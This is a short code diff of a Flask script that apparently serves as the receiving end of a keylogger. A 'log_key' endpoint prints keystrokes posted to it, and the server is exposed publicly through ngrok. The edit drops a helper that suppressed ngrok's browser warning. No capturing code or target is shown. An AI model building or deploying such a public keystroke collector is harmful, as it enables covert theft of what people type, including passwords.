@@ -171,19 +171,12 @@ def log_key():
     if data and 'key' in data:
         print(f"Key pressed: {data['key']}")
     return '', 204
-    
-def add_ngrok_header(response):
-    response.headers["ngrok-skip-browser-warning"] = "true"
-    return response
 
 if __name__ == '__main__':
     # Start Flask server in a background thread
     port = 8080
     print("Starting Flask server...")
-    public_url = ngrok.connect(
-        addr=port, 
-        bind_tls=True, 
-        headers={"ngrok-skip-browser-warning": "true"})
+    public_url = ngrok.connect(port)  # Expose the server to the internet
     print(f"Public URL: {public_url}")
     
     # Run the Flask app
